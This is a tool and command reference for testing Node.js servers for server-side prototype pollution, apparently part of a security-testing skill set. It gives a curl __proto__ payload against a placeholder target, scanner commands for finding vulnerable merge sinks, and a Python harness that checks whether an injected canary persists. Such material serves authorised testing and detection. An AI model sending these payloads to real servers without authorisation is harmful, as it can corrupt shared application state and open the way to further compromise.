# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`prototype-pollution-server-side`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -d '{"__proto__":{"sp_canary":"server-polluted"}}' -H 'Content-Type: application/json' 'https://target.example/settings'` | Pollute via the JSON sink, then read an independent endpoint for persistence | Cross-platform |
| `nodejsscan` | `nodejsscan -d ./app` | Flag recursive merge, clone, and path-set sinks that accept request data | Cross-platform |
| `Semgrep` | `semgrep -e '$M.merge($CFG, req.body)' -l javascript .` | Pinpoint merge sites where the request body reaches a shared config object | Cross-platform |

## Minimal Script Shape

A persistence harness: it pollutes through the JSON sink, then issues an independent request twice and reports whether a default reflects the canary, which distinguishes process-wide persistence from simple reflection.

```python
import json
import urllib.request

SINK = "https://target.example/settings"
READ = "https://target.example/me"
CANARY = "sp_canary"

def post(body):
    data = json.dumps(body).encode()
    req = urllib.request.Request(SINK, data=data, method="POST",
                                headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status

def read():
    req = urllib.request.Request(READ, headers={"Connection": "close"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode("utf-8", "replace")

before = CANARY in read()
post({"__proto__": {CANARY: "server-polluted"}})
after = CANARY in read()
print({"canary_before": before, "canary_after_independent_request": after,
       "verdict": "server-side-pollution" if after and not before else "no-persistence"})
```
